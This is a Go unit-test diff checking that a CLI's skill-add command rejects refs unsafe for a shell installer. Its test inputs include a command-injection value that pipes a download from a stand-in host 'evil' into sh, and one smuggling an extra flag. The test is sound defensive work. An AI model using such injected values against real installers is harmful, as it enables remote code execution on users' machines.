@@ -2718,3 +2718,25 @@ func TestResolveSubnet(t *testing.T) {
 		})
 	}
 }
+
+// A user-defined ref reaches the installer's `sh -c`, so `config skill add`
+// refuses one that is not a single shell-safe token instead of writing it.
+func TestConfigSkillAdd_RejectsUnsafeRef(t *testing.T) {
+	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
+	for _, flags := range [][]string{
+		{"--no-interactive", "--ref", "owner/repo; curl evil | sh"},
+		{"--no-interactive", "--ref", "owner/repo", "--skill", "x --global"},
+	} {
+		cmd := newConfigSkillAddCommand()
+		if err := cmd.Flags().Parse(flags); err != nil {
+			t.Fatalf("parse flags %v: %v", flags, err)
+		}
+		err := runConfigSkillAdd(cmd, []string{"mine"})
+		if err == nil || !strings.Contains(err.Error(), "invalid skill") {
+			t.Errorf("flags %v: error = %v, want an invalid skill ref/selector error", flags, err)
+		}
+		if _, ok := userSkillPath("mine"); ok {
+			t.Errorf("flags %v: an unsafe skill must not be written", flags)
+		}
+	}
+}
